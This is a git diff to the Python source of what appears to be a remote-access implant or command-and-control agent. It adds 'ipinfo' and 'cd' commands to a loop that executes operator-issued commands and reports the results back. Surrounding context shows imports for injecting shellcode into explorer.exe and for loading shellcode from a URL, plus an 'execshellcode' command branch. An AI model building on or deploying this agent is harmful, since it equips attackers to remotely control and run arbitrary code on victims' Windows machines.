@@ -33,6 +33,8 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.rm import rm
     from utils.winapi.inject_shellcode import load_shellcode_into_explorer
     from utils.winapi.load_shellcode_from_url import load_shellcode_from_url
+    from utils.winapi.cd import cd
+    from utils.winapi.ipinfo import get_ip_info
 
 logging.basicConfig(level=logging.INFO)
 smb_pipe_conn = None
@@ -206,6 +208,30 @@ def execute_commands():
                     status = 'Failed'
                     output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('ipinfo'):
+                try:
+                    result = get_ip_info()
+                    status = 'Completed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = f"{str(e)}"
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('cd'):
+                try:
+                    directory = command_text.split(' ', 1)[1]
+                    result = cd(directory)
+                    status = 'Completed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = f"{str(e)}"
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif command_text == "ipinfo":
+                command_text = "ipinfo"
 
             elif os.name == 'nt' and command_text.lower().startswith('execshellcode'):
                 try:
